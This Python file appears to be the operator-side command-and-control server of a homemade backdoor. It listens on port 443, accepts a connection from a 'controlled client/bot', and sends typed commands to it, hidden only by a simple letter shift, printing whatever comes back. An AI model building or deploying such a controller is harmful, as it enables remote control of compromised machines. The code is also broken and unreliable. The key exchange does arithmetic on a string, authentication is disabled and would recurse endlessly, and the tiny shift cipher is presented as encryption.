print("I'm Commander")

# Module Imports
import socket
import logging
import hashlib
from time import sleep

########

# Logging declarations

LEVELS = {'debug': logging.DEBUG,
          'info': logging.INFO,
          'warning': logging.WARNING,
          'error': logging.ERROR,
          'critical': logging.CRITICAL,
          }
log_out = 'debug'
level = LEVELS.get(log_out, logging.NOTSET)
logging.basicConfig(level=level)

#########

# Receiving port configurations
listen_addr = "0.0.0.0"  # All adapters
listen_port = 443  # SSL Port
listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP Socket


#########

## Funtions

# Connection Accept Functions
# Authentication Function

def encrypt(data, key):
    encrypted_out = ""
    # Reverse Cipher Encryption
    # ASCII Conversion
    for i in data:
        if (ord(i)) >= 65 and (ord(i) <= 90):
            std_out = (ord(i) + key)
            if std_out > 90:
                std_out = std_out % 90 + 64
            encrypted_out = encrypted_out + chr(std_out)
        elif (ord(i)) >= 97 and (ord(i) <= 122):
            std_out = (ord(i) + key)
            if std_out > 122:
                std_out = std_out % 122 + 96
            encrypted_out = encrypted_out + chr(std_out)
        else:
            encrypted_out = encrypted_out + chr(ord(i) + key)
    return encrypted_out


def decrypt(data, key):
    data = str(data)
    decrypted_out = ""
    # Reverse Cipher Decryption
    # ASCII Conversion
    for i in data:
        if ((ord(i)) >= 65) and (ord(i)) <= 90:
            decrypted_out = decrypted_out + chr((ord(i) - key - 65) % 26 + 65)
        elif ((ord(i)) >= 97) and (ord(i)) <= 122:
            decrypted_out = decrypted_out + chr((ord(i) - key - 97) % 26 + 97)
        else:
            decrypted_out = decrypted_out + chr(ord(i) - key)
    return decrypted_out

def auth():
    ### AUTHENTICATION MODULE
    authcode = conn.recv(1024)
    authkey = authcode.decode()
    passkey = b"passkey"
    passkey = hashlib.sha1(passkey)
    passkey = passkey.hexdigest()
    while True:
        if passkey == authkey:
            logging.debug("Authentication Successful")
            break
        else:
            logging.debug("Auth Failure")
            auth()

# Function for binding socket to adapter
def bind():
    try:
        logging.debug(f"Binding to adapter on {listen_addr} on port {listen_port}")
        listen_socket.bind((listen_addr, listen_port))
        listen_socket.listen(1)
        logging.debug(f"Binding with adapter successful")
    except socket.error as error:
        logging.debug(f"Socket binding error on interface {listen_addr}")


# Function for accepting connection for controlled client/bot
def accept():
    global conn
    global addr
    try:
        conn, addr = listen_socket.accept()
        logging.debug(f"connection with {addr} established")
        #auth()    #Check Authentication

    except socket.error as error:
        logging.debug(f"Unable to open socket")

def dh_send_handshake():
    GR2 = [17,8]
    dh_server_secret = 5
    dh_group = "GR2"
    conn.send(dh_group.encode())
    sleep(2)
    logging.debug(f"DH Public Values: {dh_group}")
    response = conn.recv(1024)
    response = response.decode()
    logging.debug(f"{response}")
    dh_server_pub = (GR2[1]**dh_server_secret)%GR2[0]
    dh_server_pub = str(dh_server_pub)
    conn.send(dh_server_pub.encode())
    logging.debug(f"DH public value sent to client is {dh_server_pub}")
    while True:
        dh_client_pub = conn.recv(1024)
        dh_client_pub = dh_client_pub.decode()
        logging.debug(f"DH Client Public Value is {dh_client_pub}")
        dh_common_secret = (dh_client_pub ** dh_server_secret) % GR2[0]
        logging.debug(f"Calculated Asymmetric Code: {dh_common_secret}")
        return dh_common_secret


def command():
    # Negotiate DH
    encryption_key = dh_send_handshake()
    while True:
        cmd = input("$#>")
        cmd = encrypt(cmd,encryption_key)
        logging.debug(f"Encrypted Command Sent : {cmd}")
        command = conn.send(cmd.encode())
        logging.debug("Command: " + str(command))
        response = conn.recv(1024)
        response = decrypt(response,encryption_key)
        logging.debug("Response: " + str(response))
        #response = response.decode()
        print(response)


if __name__ == "__main__":
    logging.debug("Invoking controller ")

    bind()
    while True:
        accept()
        command()
